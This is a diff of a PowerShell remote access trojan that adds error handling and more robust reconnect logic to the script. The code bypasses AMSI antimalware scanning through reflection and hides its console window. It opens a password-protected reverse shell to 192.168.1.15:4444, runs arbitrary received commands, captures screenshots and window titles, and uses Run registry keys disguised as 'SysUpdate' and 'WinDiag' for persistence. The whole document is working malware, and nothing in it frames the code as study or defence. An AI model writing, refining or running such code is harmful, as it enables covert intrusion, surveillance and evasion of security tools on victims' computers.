@@ -1,9 +1,14 @@
-$a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
-$a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
+try {
+    $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
+    $a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
+} catch { }
 
 $code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
-$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
-$win32::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru -ErrorAction SilentlyContinue
+$proc = Get-Process -Id $PID -ErrorAction SilentlyContinue
+if ($proc -and $proc.MainWindowHandle -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
+    $win32::ShowWindow($proc.MainWindowHandle, 0) | Out-Null
+}
 
 $ip = '192.168.1.15'
 $port = 4444
@@ -12,80 +17,130 @@ $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $regNames = @("SysUpdate", "WinDiag") 
 
 function Master-Kill {
-    foreach ($name in $regNames) { 
-        Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
-    }
-    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & exit`""
-    Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
+    try {
+        foreach ($name in $regNames) { 
+            Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
+        }
+    } catch { }
+    try {
+        $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & exit`""
+        Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } catch { }
     exit
 }
 
 while($true) {
+    $client = $null
     try {
-        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
-        $s = $c.GetStream()
-        $e = New-Object System.Text.UTF8Encoding
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $stream = $client.GetStream()
+        $encoder = New-Object System.Text.UTF8Encoding
         
-        $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
+        $authMsg = "AUTH: "
+        $authBytes = $encoder.GetBytes($authMsg)
+        $stream.Write($authBytes, 0, $authBytes.Length)
+        $stream.Flush()
         
         $wait = 0
-        while (!$s.DataAvailable -and $wait -lt 20) { 
-            Start-Sleep -Milliseconds 500
+        while (!$stream.DataAvailable -and $wait -lt 40) { 
+            Start-Sleep -Milliseconds 250
             $wait++ 
         }
 
-        [byte[]]$authB = New-Object byte[] 64
-        $len = $s.Read($authB, 0, 64)
+        if (!$stream.DataAvailable) { 
+            $client.Close()
+            Start-Sleep 3
+            continue 
+        }
+
+        [byte[]]$authBuffer = New-Object byte[] 512
+        $bytesRead = $stream.Read($authBuffer, 0, $authBuffer.Length)
         
-        if ($len -gt 0) {
-            $authResp = $e.GetString($authB, 0, $len).Trim()
-            if ($authResp -ne $pass) {
-                $s.Write(($e.GetBytes("AUTH FAIL`n")), 0, 10)
-                $c.Close(); continue
+        if ($bytesRead -gt 0) {
+            $authResponse = $encoder.GetString($authBuffer, 0, $bytesRead).Trim()
+            if ($authResponse -ne $pass) {
+                $failMsg = "AUTH FAIL`n"
+                $failBytes = $encoder.GetBytes($failMsg)
+                $stream.Write($failBytes, 0, $failBytes.Length)
+                $client.Close()
+                Start-Sleep 2
+                continue
             }
-        } else { $c.Close(); continue }
+        } else { 
+            $client.Close()
+            Start-Sleep 3
+            continue 
+        }
 
-        $s.Write(($e.GetBytes("AUTH OK`nPS " + $PWD + "> ")), 0, (20 + $PWD.Path.Length))
+        $successMsg = "AUTH OK`nPS " + (Get-Location).Path + "> "
+        $successBytes = $encoder.GetBytes($successMsg)
+        $stream.Write($successBytes, 0, $successBytes.Length)
+        $stream.Flush()
 
-        while($true) {
-            [byte[]]$b = New-Object byte[] 4096
-            $i = $s.Read($b, 0, $b.Length)
-            if ($i -le 0) { break }
+        while(($client.Connected) -and (!$stream.HasTimedOut)) {
+            if (!$stream.DataAvailable) { 
+                Start-Sleep -Milliseconds 50
+                continue 
+            }
             
-            $in = $e.GetString($b, 0, $i).Trim()
-            $out = ""
+            [byte[]]$cmdBuffer = New-Object byte[] 4096
+            $cmdBytes = $stream.Read($cmdBuffer, 0, $cmdBuffer.Length)
+            
+            if ($cmdBytes -le 0) { break }
+            
+            $command = $encoder.GetString($cmdBuffer, 0, $cmdBytes).Trim()
+            $output = ""
 
-            if ($in -eq 'kill') { Master-Kill }
-            elseif ($in -eq 'screen') {
-                Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);' -Name "Util" -Namespace Win32 -ErrorAction SilentlyContinue
-                $handle = [Win32.Util]::GetForegroundWindow()
-                $sb = New-Object System.Text.StringBuilder 256
-                [Win32.Util]::GetWindowText($handle, $sb, $sb.Capacity)
-                $out = "[WINDOW] " + $sb.ToString() + "`n"
+            if ($command -eq 'kill') { 
+                Master-Kill 
             }
-            elseif ($in -eq 'screenshot') {
+            elseif ($command -eq 'screen') {
+                try {
+                    Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);' -Name "Util" -Namespace Win32 -ErrorAction SilentlyContinue
+                    $handle = [Win32.Util]::GetForegroundWindow()
+                    $sb = New-Object System.Text.StringBuilder 256
+                    [Win32.Util]::GetWindowText($handle, $sb, $sb.Capacity)
+                    $output = "[WINDOW] " + $sb.ToString() + "`n"
+                } catch { $output = "[WINDOW] Error getting window title`n" }
+            }
+            elseif ($command -eq 'screenshot') {
                 try {
                     Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
-                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                    $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
-                    $g = [Drawing.Graphics]::FromImage($bmp)
-                    $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
-                    $ms = New-Object IO.MemoryStream
-                    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
-                    $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
-                    $g.Dispose(); $bmp.Dispose(); $ms.Close()
-                } catch { $out = "Screenshot failed`n" }
+                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+                    $graphics = [Drawing.Graphics]::FromImage($bitmap)
+                    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
+                    $memoryStream = New-Object IO.MemoryStream
+                    $bitmap.Save($memoryStream, [Drawing.Imaging.ImageFormat]::Jpeg, 75L)
+                    $output = [Convert]::ToBase64String($memoryStream.ToArray()) + "`n"
+                    $graphics.Dispose()
+                    $bitmap.Dispose()
+                    $memoryStream.Close()
+                } catch { 
+                    $output = "Screenshot failed: $_`n" 
+                }
             }
             else {
-                $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
+                try {
+                    $result = Invoke-Expression $command 2>&1
+                    $output = $result | Out-String
+                } catch { 
+                    $output = $_.Exception.Message + "`n" 
+                }
             }
             
-            $out = $out -replace "`r`n|\r", "`n"
+            $output = $output -replace "`r`n|\r", "`n"
             $prompt = "`nPS " + (Get-Location).Path + "> "
-            $resp = $e.GetBytes($out + $prompt)
-            $s.Write($resp, 0, $resp.Length)
+            $response = $encoder.GetBytes($output + $prompt)
+            $stream.Write($response, 0, $response.Length)
+            $stream.Flush()
         }
-        $c.Close()
     } 
-    catch { Start-Sleep 5 }
+    catch { 
+    }
+    finally {
+        try { if ($client) { $client.Close() } } catch { }
+        try { if ($stream) { $stream.Close() } } catch { }
+    }
+    Start-Sleep 3
 }
